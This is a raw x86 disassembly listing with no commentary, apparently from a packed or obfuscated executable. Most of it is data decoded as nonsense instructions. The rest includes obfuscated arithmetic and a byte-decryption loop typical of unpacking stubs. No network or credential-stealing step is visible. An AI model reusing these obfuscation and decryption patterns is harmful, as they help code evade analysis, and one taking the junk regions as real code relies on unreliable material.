  416413:	test   BYTE PTR [edx+edx*4+0x57],0x9a
  416418:	enter  0x4bf,0xe9
  41641c:	in     eax,dx
  41641d:	mov    ebp,?
  41641f:	jne    0x4163fb
  416421:	fs pop esp
  416423:	xor    bh,dl
  416425:	je     0x416499
  416427:	push   ecx
  416428:	test   eax,0xa235083a
  41642d:	xor    BYTE PTR [eax],dh
  41642f:	test   DWORD PTR [edi+ebx*4],esp
  416432:	cmc    
  416433:	aam    0x7
  416435:	aad    0x19
  416437:	sbb    ecx,DWORD PTR [ecx+0x2f96c44c]
  41643d:	or     ah,bh
  41643f:	in     eax,0x9
  416441:	mov    edx,0xcabfa291
  416446:	int3   
  416447:	neg    BYTE PTR [esi]
  416449:	mov    dl,BYTE PTR [edi]
  41644b:	fst    QWORD PTR [ebp-0x3788c4f9]
  416451:	loopne 0x416408
  416453:	in     al,0x3e
  416455:	pusha  
  416456:	jbe    0x416402
  416458:	sub    al,0xef
  41645a:	in     eax,0xa1
  41645c:	xlat   BYTE PTR ds:[ebx]
  41645d:	mul    edi
  41645f:	ins    BYTE PTR es:[edi],dx
  416460:	and    eax,DWORD PTR [edx+0x20]
  416463:	mov    DWORD PTR [esp+edi*2-0x6898ecab],esi
  41646a:	jl     0x41646e
  41646c:	popa   
  41646d:	fdiv   DWORD PTR [edi-0x503a1a49]
  416473:	ret    0x98e4
  416476:	or     BYTE PTR [ecx+esi*8],dh
  416479:	xchg   BYTE PTR [ecx],ch
  41647b:	imul   edi
  41647d:	js     0x4164e5
  41647f:	dec    esi
  416480:	mov    al,ds:0x364a00ac
  416485:	das    
  416486:	push   0x60
  416488:	mov    BYTE PTR [ebx],bl
  41648a:	(bad)  [eax]
  41648c:	out    dx,eax
  41648d:	fldz   
  41648f:	mov    bh,0xb4
  416491:	or     BYTE PTR [ebx+eax*1-0x22f4c4b5],bh
  416498:	lds    ebp,FWORD PTR [ebp+0x6e]
  41649b:	and    al,0xcd
  41649d:	scas   eax,DWORD PTR es:[edi]
  41649e:	imul   ebx,DWORD PTR [ebx-0x2bc57316],0x96b47849
  4164a8:	das    
  4164a9:	xor    eax,0x4df904e3
  4164ae:	test   dl,ah
  4164b0:	pop    eax
  4164b1:	adc    DWORD PTR [edx-0x55],ebp
  4164b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164b5:	sbb    ecx,DWORD PTR [edx+0x5ec0db64]
  4164bb:	jl     0x41647d
  4164bd:	add    DWORD PTR [ebp-0x43],0x4c00f60c
  4164c4:	push   ebx
  4164c5:	add    eax,0x2e54c072
  4164ca:	(bad)  
  4164cb:	jo     0x4164fb
  4164cd:	inc    esp
  4164ce:	dec    esi
  4164cf:	leave  
  4164d0:	outs   dx,BYTE PTR ds:[esi]
  4164d1:	add    DWORD PTR [esi-0x4e],eax
  4164d4:	out    dx,al
  4164d5:	ss fs mov esp,0x9b10a360
  4164dc:	ret    
  4164dd:	rol    ecx,1
  4164df:	jb     0x416485
  4164e1:	cld    
  4164e2:	xchg   ecx,eax
  4164e3:	xor    BYTE PTR [esp+ecx*8],dl
  4164e6:	sub    DWORD PTR [ecx],esp
  4164e8:	aad    0x6d
  4164ea:	push   eax
  4164eb:	inc    ebp
  4164ec:	pusha  
  4164ed:	dec    edi
  4164ee:	in     eax,dx
  4164ef:	stos   DWORD PTR es:[edi],eax
  4164f0:	cmp    DWORD PTR [eax-0x212f0d7b],ebp
  4164f6:	adc    DWORD PTR [ecx-0x2f2a151f],esi
  4164fc:	dec    ebp
  4164fd:	enter  0xca29,0x25
  416501:	and    BYTE PTR [ebp+edx*8+0x512f4ece],dh
  416508:	push   0x34a6c25c
  41650d:	sahf   
  41650e:	(bad)
  416512:	(bad)  
  416513:	call   DWORD PTR [eax+0x14f8bf55]
  416519:	sbb    ebx,DWORD PTR [ebx-0x4c]
  41651c:	sbb    esi,ecx
  41651e:	sub    al,0x3e
  416520:	stos   DWORD PTR es:[edi],eax
  416521:	jl     0x416585
  416523:	or     cl,BYTE PTR [edx+eax*1]
  416526:	adc    DWORD PTR [edx+eax*2+0x4e5d5214],esp
  41652d:	(bad)  
  41652e:	mov    bh,BYTE PTR [eax+esi*1+0x4c244c3f]
  416535:	adc    al,0x5c
  416537:	adc    dl,BYTE PTR ds:0x6c6e7c7b
  41653d:	inc    ebx
  41653e:	sub    BYTE PTR [edx],bh
  416540:	stos   DWORD PTR es:[edi],eax
  416541:	sar    DWORD PTR [esi],1
  416543:	adc    esp,edx
  416545:	cmp    bl,al
  416547:	mov    dl,ah
  416549:	dec    esp
  41654a:	adc    BYTE PTR [eax],cl
  41654c:	add    al,0x3c
  41654e:	pushf  
  41654f:	sbb    edi,DWORD PTR [edx+0x65]
  416552:	mov    edx,0xe79e7cff
  416557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416558:	std    
  416559:	test   eax,0x5f631ff7
  41655e:	xor    eax,edi
  416560:	shr    eax,0x2
  416563:	or     ecx,eax
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422578
  416605:	mov    edi,0x4224be
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422578
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp-0x6e5b9d90]
  416729:	jo     0x4167a2
  41672b:	cld    
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx-0x69e7e7ec],bl
  416733:	das    
  416734:	lock cs pop ebx
  416737:	cmp    DWORD PTR [esi],0x8
  41673a:	(bad)  
  41673b:	sbb    BYTE PTR [edi],ch
  41673d:	sbb    al,0x9b
  41673f:	int3   
  416740:	test   eax,0xab41c05b
  416745:	sahf   
  416746:	cmc    
  416747:	rcl    BYTE PTR [eax],cl
  416749:	jno    0x416733
  41674b:	cmp    ebp,DWORD PTR [ecx+0x186b96e5]
  416751:	stos   BYTE PTR es:[edi],al
  416752:	xchg   esi,eax
  416753:	inc    esi
  416754:	add    eax,0x25d7e810
  416759:	test   DWORD PTR [edx-0x62],eax
  41675c:	xchg   eax,ecx
  41675e:	jns    0x416702
  416760:	cmp    DWORD PTR [ebp-0x58],ecx
  416763:	push   esp
  416764:	clc    
  416765:	enter  0x76e9,0x74
  416769:	push   ds
  41676a:	sbb    eax,0x747139ba
  41676f:	call   0x99b153f3
  416774:	imul   edi,eax,0x14
  416777:	std    
  416778:	inc    edi
  416779:	or     bl,BYTE PTR [esi+0x1369a5cc]
  41677f:	or     al,0x97
  416781:	cmp    DWORD PTR [ebx-0x894531a],0xc6fc90bb
  41678b:	sub    bl,BYTE PTR [eax]
  41678d:	xor    ah,BYTE PTR [esi]
  41678f:	into   
  416790:	call   0xf8f1:0xf392cf51
  416797:	std    
  416798:	jecxz  0x416786
  41679a:	or     bl,BYTE PTR [esi]
  41679c:	mov    bl,ch
  41679e:	cli    
  41679f:	dec    esp
  4167a0:	mov    dl,0x7d
  4167a2:	pushf  
  4167a3:	sahf   
  4167a4:	popf   
  4167a5:	(bad)  
  4167a6:	cmp    esi,ebp
  4167a8:	xchg   esp,eax
  4167a9:	sub    edi,DWORD PTR [esi-0x586dc4b7]
  4167af:	dec    ebp
  4167b0:	cmp    esp,DWORD PTR [edx-0x2f]
  4167b3:	cld    
  4167b4:	dec    ebp
  4167b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167b6:	pop    esi
  4167b7:	call   0xfd0a84f7
  4167bc:	popa   
  4167bd:	pop    ds
  4167be:	shr    DWORD PTR ds:0xa95ecb0c,1
  4167c4:	dec    ebx
  4167c5:	xor    ah,al
  4167c7:	mov    ah,0x2f
  4167c9:	loopne 0x416830
  4167cb:	mov    bh,0x5f
  4167cd:	sbb    eax,0xa74a19b4
  4167d2:	push   esi
  4167d3:	test   eax,0x68becc3a
  4167d8:	mov    ebp,0xa28de884
  4167dd:	and    edx,edi
  4167df:	in     eax,0xfd
  4167e1:	sar    ebx,1
  4167e3:	icebp  
  4167e4:	jmp    0x140:0x7a0231e1
  4167eb:	mov    BYTE PTR [ebx+0x56],0x61
  4167ef:	inc    ebx
  4167f0:	dec    ebx
  4167f1:	adc    ebp,eax
  4167f3:	mov    dl,ch
  4167f5:	out    0x4a,al
  4167f7:	and    cl,ah
  4167f9:	push   ss
  4167fa:	mov    bh,0xce
  4167fc:	adc    eax,DWORD PTR [edi+0x7]
  4167ff:	ror    esp,0x1
  416802:	push   cs
  416803:	gs push ebx
  416805:	sbb    BYTE PTR [esi+0x75],0x1
  416809:	add    ch,BYTE PTR [esi-0x4e]
  41680c:	adc    BYTE PTR [ecx+ebx*4],ah
  41680f:	cld    
  416810:	adc    edx,DWORD PTR [ebx]
  416812:	or     al,0xd8
  416814:	or     bh,BYTE PTR [eax+0x2e]
  416817:	add    BYTE PTR [ecx+0x50],bl
  41681a:	hlt    
  41681b:	inc    edx
  41681c:	jae    0x416821
  41681e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41681f:	ret    
  416820:	sti    
  416821:	sub    al,0x85
  416823:	cli    
  416824:	dec    ebx
  416825:	sbb    eax,0x1520fd08
  41682a:	pop    esp
  41682b:	xchg   esi,eax
  41682c:	ret    0x1d66
  41682f:	mov    edi,0xb717a0af
  416834:	xchg   edx,eax
  416835:	push   esi
  416836:	push   0x29
  416838:	xchg   ebx,eax
  416839:	ficomp WORD PTR [esi+ebp*8-0x5d705ef7]
  416840:	sub    ch,BYTE PTR [eax-0x7f]
  416843:	mov    gs,WORD PTR [ebp-0x12]
  416846:	and    al,0xd1
  416848:	icebp  
  416849:	and    al,0x30
  41684b:	mov    bl,0x97
  41684d:	test   BYTE PTR [eax-0x5e20410b],cl
  416853:	test   eax,0x52ef924
  416858:	jns    0x4168bc
  41685a:	push   esp
  41685b:	test   eax,0xc48600b4
  416860:	cmp    DWORD PTR [ebp-0x2a],0x102982da
  416867:	mov    ebp,0x2aa60e16
  41686c:	mov    edi,0x165d9e5
  416871:	mov    edx,0xd68dffe4
  416876:	fwait
  416877:	push   ds
  416878:	lahf   
  416879:	jns    0x4168df
  41687b:	mov    ecx,0x67e5726b
  416880:	sub    al,BYTE PTR [ecx-0x3f]
  416883:	es inc esi
  416885:	rcr    BYTE PTR [eax],1
  416887:	int    0x71
  416889:	ret    0x64c2
  41688c:	das    
  41688d:	jbe    0x416846
  41688f:	leave  
  416890:	cmp    ah,ah
  416892:	xchg   ebx,eax
  416893:	scas   eax,DWORD PTR es:[edi]
  416894:	push   ecx
  416895:	iret   
  416896:	std    
  416897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416898:	out    dx,eax
  416899:	push   0x7857d7d6
  41689e:	xor    BYTE PTR [edi+0x504d0d],ch
  4168a4:	js     0x41688d
  4168a6:	adc    DWORD PTR [edi+0x10],0xffffffe1
  4168aa:	mov    ah,0x73
  4168ac:	lahf   
  4168ad:	jg     0x416838
  4168af:	bound  eax,QWORD PTR [eax-0x2d]
  4168b2:	enter  0x2bfe,0xe2
  4168b6:	push   edi
  4168b7:	pusha  
  4168b8:	pop    edx
  4168b9:	push   ecx
  4168ba:	push   0xc87385e2
  4168bf:	iret   
  4168c0:	sub    edx,DWORD PTR [ebp+0x8c5fcba]
  4168c6:	dec    edi
  4168c7:	and    al,0x2a
  4168c9:	sub    al,0x13
  4168cb:	fist   WORD PTR [ebp-0x6c]
  4168ce:	inc    edx
  4168cf:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168d1:	popf   
  4168d2:	pop    esp
  4168d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168d4:	aaa    
  4168d5:	xor    esi,eax
  4168d7:	iret   
  4168d8:	int    0x5a
  4168da:	aas    
  4168db:	pushf  
  4168dc:	mov    ss,WORD PTR [edi]
  4168de:	sub    DWORD PTR [ecx],esi
  4168e0:	pop    esp
  4168e1:	arpl   WORD PTR [edi],sp
  4168e3:	add    eax,0xb58cd4e9
  4168e8:	xor    BYTE PTR [ebx+0x64],0x7a
  4168ec:	inc    ebx
  4168ed:	setbe  bl
  4168f0:	and    DWORD PTR [eax],0xa8d75b2
  4168f6:	dec    edx
  4168f7:	shl    BYTE PTR [edi+0x3e],1
  4168fa:	mov    esp,0xb53b8c2b
  4168ff:	xchg   edx,eax
  416900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416901:	cmp    BYTE PTR [eax-0x5b],ah
  416904:	or     DWORD PTR [edx],0xffffffa8
  416907:	outs   dx,DWORD PTR ds:[esi]
  416908:	lock dec edx
  41690a:	push   0x2c
  41690c:	xor    BYTE PTR [ebx+edx*4-0x6c34a96c],cl
  416913:	jbe    0x4168a2
  416915:	clc    
  416916:	pop    ss
  416917:	retf   
  416918:	sbb    bh,cl
  41691a:	fs mov cl,0x40
  41691d:	jle    0x4168a9
  41691f:	psubw  mm5,QWORD PTR [esi]
  416922:	inc    edx
  416923:	add    BYTE PTR [edi+0x7e],cl
  416926:	sub    ebx,edx
  416928:	lea    eax,[esi]
  41692a:	inc    esi
  41692b:	or     DWORD PTR [ebp+0x5b],esp
  41692e:	sahf   
  41692f:	add    BYTE PTR [ebp-0x6b98e03d],0xde
  416936:	sbb    eax,0x1f0bf839
  41693b:	pushf  
  41693c:	and    ebp,DWORD PTR [ebp+0x6df403f2]
  416942:	fcom   DWORD PTR [edi]
  416944:	xchg   edx,eax
  416945:	push   ebp
  416946:	jbe    0x416996
  416948:	in     eax,0x16
  41694a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41694b:	cli    
  41694c:	mov    bl,0x24
  41694e:	sahf   
  41694f:	ret    
  416950:	imul   ecx,DWORD PTR [eax],0x31
  416953:	bswap  ebp
  416955:	pop    ebx
  416956:	add    al,0xa5
  416958:	inc    ebx
  416959:	jle    0x4168ef
  41695b:	ror    eax,0x73
  41695e:	cmp    bl,bh
  416960:	iret   
  416961:	xchg   bl,cl
  416963:	retf   
  416964:	push   eax
  416965:	cmp    eax,esp
  416967:	neg    DWORD PTR [edx+0x5c]
  41696a:	adc    BYTE PTR [ecx],bh
  41696c:	rcr    BYTE PTR [esi],1
  41696e:	pop    edi
  41696f:	push   esi
  416970:	(bad)  
  416971:	lods   eax,DWORD PTR ds:[esi]
  416972:	mov    ebx,DWORD PTR [ecx+edi*4]
  416975:	lea    eax,[ebp-0x2]
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0x7c79ccea
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx+0x36181814],bl
  4169ac:	adc    BYTE PTR [ecx+0x1a1587de],dl
  4169b2:	push   esi
  4169b3:	lock out 0x38,al
  4169b6:	xchg   esi,eax
  4169b7:	xchg   ecx,eax
  4169b8:	mov    eax,ds:0x358895a2
  4169bd:	test   al,0x2f
  4169bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169c0:	aad    0xd9
  4169c2:	or     al,0x46
  4169c4:	pop    ecx
  4169c5:	out    dx,eax
  4169c6:	push   es
  4169c7:	add    eax,eax
  4169c9:	arpl   WORD PTR [edx+edi*2],cx
  4169cc:	and    ah,BYTE PTR [ebx+ebp*8]
  4169cf:	dec    edx
  4169d0:	test   cl,cl
  4169d2:	scas   al,BYTE PTR es:[edi]
  4169d3:	std    
  4169d4:	push   eax
  4169d5:	jmp    0x9bb0caab
  4169da:	dec    ecx
  4169db:	mov    ds:0x24c90dd,eax
  4169e0:	lods   al,BYTE PTR ds:[esi]
  4169e1:	lods   al,BYTE PTR fs:[esi]
  4169e3:	cdq    
  4169e4:	xchg   edx,eax
  4169e5:	mov    bh,0x45
  4169e7:	jmp    0x40a46951
  4169ec:	add    BYTE PTR [esp+eax*1-0x364af0b8],bl
  4169f3:	jmp    0x82f4a3b4
  4169f8:	sub    eax,0x8c7c88ec
  4169fd:	les    ebp,FWORD PTR [edi]
  4169ff:	xchg   ebp,eax
  416a00:	xchg   edi,eax
  416a01:	push   esp
  416a02:	push   ebp
  416a03:	pop    es
  416a04:	jl     0x416a4f
  416a06:	xor    eax,0xbc83efc4
  416a0b:	stos   BYTE PTR es:[edi],al
  416a0c:	jle    0x416a7f
  416a0e:	mov    ah,0x15
  416a10:	add    al,0x38
  416a12:	dec    esi
  416a13:	add    BYTE PTR [edi],dh
  416a15:	shr    BYTE PTR [edx-0x52],1
  416a18:	mov    DWORD PTR ds:0xba34d82e,esp
  416a1e:	pushf  
  416a1f:	inc    ebx
  416a20:	pop    esp
  416a21:	xchg   BYTE PTR [eax],dh
  416a23:	sbb    ch,BYTE PTR [edx+eiz*1-0x6b115f0f]
  416a2a:	aam    0x4e
  416a2c:	mov    ebx,0x6a221c7
  416a31:	cmc    
  416a32:	sbb    DWORD PTR gs:[esi+0x26],0x8b4f56b5
  416a3a:	mov    esi,0x2a42077f
  416a3f:	pop    ds
  416a40:	pop    ecx
  416a41:	jne    0x416a99
  416a43:	adc    esi,DWORD PTR [eax+0x58]
  416a46:	loope  0x416a01
  416a48:	sub    al,0xb8
  416a4a:	(bad)  
  416a4b:	push   0x59
  416a4d:	sbb    BYTE PTR [esi+eax*8+0x5da970d4],cl
  416a54:	add    al,0x4f
  416a56:	aad    0x6a
  416a58:	adc    esp,DWORD PTR [esi+0x1b15ed9f]
  416a5e:	arpl   WORD PTR [ecx],bx
  416a60:	test   eax,0x6cff3e74
  416a65:	xor    ebx,DWORD PTR [ecx+0x46]
  416a68:	lods   eax,DWORD PTR ds:[esi]
  416a69:	iret   
  416a6a:	mov    edx,0xa5604ac5
  416a6f:	dec    ecx
  416a70:	(bad)  
  416a71:	arpl   WORD PTR [ebp-0x79],di
  416a74:	adc    ebp,edx
  416a76:	pop    eax
  416a77:	inc    eax
  416a78:	jbe    0x416a81
  416a7a:	push   esp
  416a7b:	pusha  
  416a7c:	ins    DWORD PTR es:[edi],dx
  416a7d:	test   DWORD PTR [edi+0x11],esp
  416a80:	in     eax,dx
  416a81:	dec    edx
  416a82:	mov    eax,0x2e274090
  416a87:	dec    ebp
  416a88:	mov    ah,cl
  416a8a:	gs inc ebp
  416a8c:	add    eax,0x7c61f620
  416a91:	aam    0x92
  416a93:	jmp    0xaad1:0xfe8ca992
  416a9a:	dec    esp
  416a9b:	pop    edx
  416a9c:	inc    edx
  416a9d:	gs repz es ds inc esp
  416aa2:	mov    al,ds:0x3a15c9cf
  416aa7:	or     dh,BYTE PTR [ebp+0x5b]
  416aaa:	xchg   ecx,eax
  416aab:	cmp    ch,bh
  416aad:	cld    
  416aae:	push   cs
  416aaf:	xor    ch,BYTE PTR [esp+eax*4-0x298d7727]
  416ab6:	xchg   edi,eax
  416ab7:	sbb    ecx,DWORD PTR [eax-0x43]
  416aba:	jge    0x416a70
  416abc:	bound  edi,QWORD PTR [esp+edi*8]
  416abf:	jg     0x416ad2
  416ac1:	mov    ds:0xb10ab6bb,al
  416ac6:	(bad)  
  416ac7:	and    al,BYTE PTR [esi]
  416ac9:	lods   eax,DWORD PTR ds:[esi]
  416aca:	leave  
  416acb:	adc    al,0xb
  416acd:	sbb    ebp,eax
  416acf:	dec    eax
  416ad0:	test   BYTE PTR [ecx+esi*8+0x41],dl
  416ad4:	xor    bh,BYTE PTR [ecx]
  416ad6:	(bad)  
  416ad7:	pop    ecx
  416ad8:	and    cl,BYTE PTR [ebp-0x9258add]
  416ade:	sub    al,0xbf
  416ae0:	and    eax,esi
  416ae2:	shl    bh,cl
  416ae4:	jb     0x416b1a
  416ae6:	sar    DWORD PTR [ebx+0x21],0xed
  416aea:	in     eax,dx
  416aeb:	mov    ds:0xa189b275,al
  416af0:	aas    
  416af1:	aaa    
  416af2:	call   0xf929:0xfd1bfb16
  416af9:	cmp    DWORD PTR [eax],0xffffffe4
  416afc:	and    eax,0xce4e5729
  416b01:	cmc    
  416b02:	jge    0x416b57
  416b04:	and    eax,0x58808f84
  416b09:	push   ss
  416b0a:	sub    ebx,DWORD PTR [edi+eax*2]
  416b0d:	mov    esi,0xa7821cec
  416b12:	adc    BYTE PTR [edi+ebp*4-0x332c8e31],0x86
  416b1a:	rcl    DWORD PTR [ebp-0x6dfdde29],cl
  416b20:	test   al,0x70
  416b22:	push   ecx
  416b23:	(bad)  
  416b24:	inc    esi
  416b25:	stos   BYTE PTR es:[edi],al
  416b26:	je     0x416b52
  416b28:	push   eax
  416b29:	aad    0x66
  416b2b:	dec    ebp
  416b2c:	mov    al,ds:0x1255c9c9
  416b31:	xor    DWORD PTR [eax-0x3d3a4ba2],esp
  416b37:	int3   
  416b38:	mov    eax,ds:0x990d5238
  416b3d:	xor    al,0xf7
  416b3f:	cmp    al,0xbe
  416b41:	fisub  WORD PTR [esi]
  416b43:	sar    DWORD PTR [esi+0x18a21888],0xcd
  416b4a:	inc    ebx
  416b4b:	mov    ah,0x27
  416b4d:	add    bh,BYTE PTR [ebx+eiz*4-0x41acea28]
  416b54:	pop    ebp
  416b55:	loopne 0x416ae6
  416b57:	mov    ah,0x9a
  416b59:	popf   
  416b5a:	repz rcr DWORD PTR [ebx],0xf9
  416b5e:	inc    esi
  416b5f:	jl     0x416b1a
  416b61:	adc    DWORD PTR [edi+0x6ab88e51],edi
  416b67:	fdiv   st,st(5)
  416b69:	push   cs
  416b6a:	sbb    DWORD PTR [esi],ecx
  416b6c:	and    DWORD PTR [edx],edx
  416b6e:	sbb    eax,0x81147f52
  416b73:	mov    ebp,0xfb21b60c
  416b78:	or     eax,0x28dc533b
  416b7d:	int3   
  416b7e:	inc    eax
  416b7f:	loope  0x416b1d
  416b81:	shl    dl,cl
  416b83:	mov    al,ds:0x258d036a
  416b88:	push   0xffffff90
  416b8a:	(bad)  
  416b8b:	mov    ebp,0x6e93c2cf
  416b90:	test   al,0x79
  416b92:	pop    ds
  416b93:	hlt    
  416b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b95:	push   cs
  416b96:	sub    BYTE PTR [edi+0x4a0ed6f],ch
  416b9c:	int    0x3e
  416b9e:	adc    eax,0xbddacb91
  416ba3:	xlat   BYTE PTR ds:[ebx]
  416ba4:	inc    esp
  416ba5:	jge    0x416b2a
  416ba7:	mov    ?,WORD PTR [ebx-0xf2e5697]
  416bad:	in     al,0x62
  416baf:	sar    BYTE PTR [edi+0x5d],cl
  416bb2:	dec    ecx
  416bb3:	lea    ebp,[edx+0x68]
  416bb6:	xchg   ebx,eax
  416bb7:	test   eax,0x255082e9
  416bbc:	jmp    0x5a3f:0x4d5d1b02
  416bc3:	jo     0x416bb2
  416bc5:	adc    al,0x34
  416bc7:	bound  esp,QWORD PTR [edi-0x507fc773]
  416bcd:	add    bl,ah
  416bcf:	xchg   esp,eax
  416bd0:	(bad)  
  416bd1:	mov    ch,0x6d
  416bd3:	popf   
  416bd4:	sub    eax,edi
  416bd6:	and    ebp,DWORD PTR [ecx-0x1174c58b]
  416bdc:	or     edi,DWORD PTR [eax]
  416bde:	push   esp
  416bdf:	stc    
  416be0:	xchg   ebp,eax
  416be1:	dec    edi
  416be2:	sbb    BYTE PTR [edx-0x62],bl
  416be5:	pop    esp
  416be6:	cmp    BYTE PTR [edx-0x3a],bl
  416be9:	and    bh,dl
  416beb:	sbb    al,0xc6
